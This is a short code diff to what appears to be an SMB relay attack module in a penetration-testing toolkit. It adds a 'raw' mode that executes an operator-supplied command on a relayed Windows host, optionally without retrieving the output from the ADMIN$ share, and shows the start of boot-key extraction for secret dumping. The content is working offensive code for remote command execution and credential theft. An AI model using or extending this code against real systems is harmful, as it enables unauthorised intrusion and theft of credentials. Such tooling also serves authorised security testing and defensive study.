@@ -98,12 +98,16 @@ class SMBAttack(ProtocolAttack):
 
             try:
                 if self.config.command is not None:
-                    remoteOps._RemoteOperations__executeRemote(self.config.command)
+                    if self.config.raw:
+                        remoteOps._RemoteOperations__executeRemoteRaw(self.config.command)
+                    else:
+                        remoteOps._RemoteOperations__executeRemote(self.config.command)
                     LOG.info("Executed specified command on host: %s", self.__SMBConnection.getRemoteHost())
-                    self.__answerTMP = ''
-                    self.__SMBConnection.getFile('ADMIN$', 'Temp\\__output', self.__answer)
-                    self.__SMBConnection.deleteFile('ADMIN$', 'Temp\\__output')
-                    print(self.__answerTMP.decode(self.config.encoding, 'replace'))
+                    if not self.config.raw:
+                        self.__answerTMP = ''
+                        self.__SMBConnection.getFile('ADMIN$', 'Temp\\__output', self.__answer)
+                        self.__SMBConnection.deleteFile('ADMIN$', 'Temp\\__output')
+                        print(self.__answerTMP.decode(self.config.encoding, 'replace'))
                 else:
                     bootKey = remoteOps.getBootKey()
                     remoteOps._RemoteOperations__serviceDeleted = True
